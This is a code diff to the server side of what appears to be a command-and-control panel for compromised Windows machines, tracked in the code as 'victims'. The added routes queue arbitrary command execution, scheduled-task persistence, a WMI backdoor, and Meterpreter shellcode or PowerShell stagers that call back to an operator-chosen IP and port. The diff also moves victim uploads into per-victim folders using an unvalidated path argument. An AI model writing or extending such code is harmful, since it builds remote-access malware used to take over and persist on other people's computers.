@@ -13,7 +13,7 @@ import os
 
 import payload
 import config
-from models import victim, action, upload, download
+from models import victim, action, upload, download, settings
 
 server = Module(__name__)
 
@@ -42,6 +42,18 @@ def setCmd():
     p = payload.payload()
     pid = md5(str(time.time())+config.SECRET_KEY+signature+cmd+str(random.random()))
     exploit = p.cmd(cmd)
+    a.add(pid, signature, '[cmd] '+cmd, exploit)
+    return pid
+
+@server.route('/setExec', methods=['POST'])
+@login_required
+def setExec():
+    signature = request.form.get('signature').strip()
+    cmd = request.form.get('cmd').strip()
+    a = action.action()
+    p = payload.payload()
+    pid = md5(str(time.time())+config.SECRET_KEY+signature+cmd+str(random.random()))
+    exploit = p.run(cmd)
     a.add(pid, signature, '[cmd] '+cmd, exploit)
     return pid
 
@@ -108,9 +120,10 @@ def getUploadedFileByPid():
     result = a.getbypid(pid)
     filename = result['filename']
     originalname = result['originalname']
-    if not os.path.exists(config.upload_dir+os.sep+filename):
+    signature = result['signature']
+    if not os.path.exists(config.upload_dir+os.sep+signature+os.sep+filename):
         return 'error'
-    with open(config.upload_dir+os.sep+filename, 'r') as f:
+    with open(config.upload_dir+os.sep+signature+os.sep+filename, 'r') as f:
         data = f.read()
     #TODO: change content-type and use originalname
     return data
@@ -119,14 +132,15 @@ def getUploadedFileByPid():
 @login_required
 def getUploadedFileByName():
     filename = request.args.get('filename')
+    signature = request.args.get('signature')
     if not filename:
         return 'error'
     pattern = r"^[0-9a-f]{32}$"
     if not re.match(pattern, filename):
         return 'error'
-    if not os.path.exists(config.upload_dir+os.sep+filename):
+    if not os.path.exists(config.upload_dir+os.sep+signature+os.sep+filename):
         return 'error'
-    with open(config.upload_dir+os.sep+filename, 'r') as f:
+    with open(config.upload_dir+os.sep+signature+os.sep+filename, 'r') as f:
         data = f.read()
     return data
 
@@ -224,9 +238,10 @@ def deleteSession():
 @login_required
 def deleteUpload():
     filename = request.form.get('filename').strip()
+    signature = request.form.get('signature').strip()
     u = upload.upload()
     u.delete(filename)
-    os.remove(config.upload_dir+os.sep+filename)
+    os.remove(config.upload_dir+os.sep+signature+os.sep+filename)
     return 'success'
 
 @server.route('/deleteDownload', methods=['POST'])
@@ -237,3 +252,57 @@ def deleteDownload():
     u.delete(filename)
     os.remove(config.download_dir+os.sep+filename)
     return 'success'
+
+@server.route('/setWindowsTasks', methods=['POST'])
+@login_required
+def setWindowsTasks():
+    signature = request.form.get('signature').strip()
+    t = request.form.get('time').strip()
+    a = action.action()
+    p = payload.payload()
+    pid = md5(str(time.time())+config.SECRET_KEY+signature+t+str(random.random()))
+    exploit = p.WindowsTasks(t)
+    a.add(pid, signature, '[WindowsTasks] '+t, exploit)
+    return pid
+
+@server.route('/setWmiBackdoor', methods=['POST'])
+@login_required
+def setWmiBackdoor():
+    signature = request.form.get('signature').strip()
+    a = action.action()
+    p = payload.payload()
+    pid = md5(str(time.time())+config.SECRET_KEY+signature+str(random.random()))
+    exploit = p.WmiBackdoor()
+    a.add(pid, signature, '[WmiBackdoor] launched', exploit)
+    return pid
+
+@server.route('/plantMeterpreter0', methods=['POST'])
+@login_required
+def plantMeterpreter0():
+    signature = request.form.get('signature').strip()
+    ip = request.form.get('ip').strip()
+    port = request.form.get('port').strip()
+    a = action.action()
+    p = payload.payload()
+    s = settings.settings()
+    s.set('LHOST', ip)
+    s.set('LPORT', port)
+    pid = md5(str(time.time())+config.SECRET_KEY+signature+str(random.random()))
+    exploit = p.MeterpreterShellcode()
+    a.add(pid, signature, '[MeterpreterShellcode] %s:%s'%(ip, port), exploit)
+    return pid
+@server.route('/plantMeterpreter1', methods=['POST'])
+@login_required
+def plantMeterpreter1():
+    signature = request.form.get('signature').strip()
+    ip = request.form.get('ip').strip()
+    port = request.form.get('port').strip()
+    a = action.action()
+    p = payload.payload()
+    s = settings.settings()
+    s.set('LHOST', ip)
+    s.set('LPORT', port)
+    pid = md5(str(time.time())+config.SECRET_KEY+signature+str(random.random()))
+    exploit = p.PowershellMeterpreterx86()
+    a.add(pid, signature, '[PowershellMeterpreter] %s:%s'%(ip, port), exploit)
+    return pid
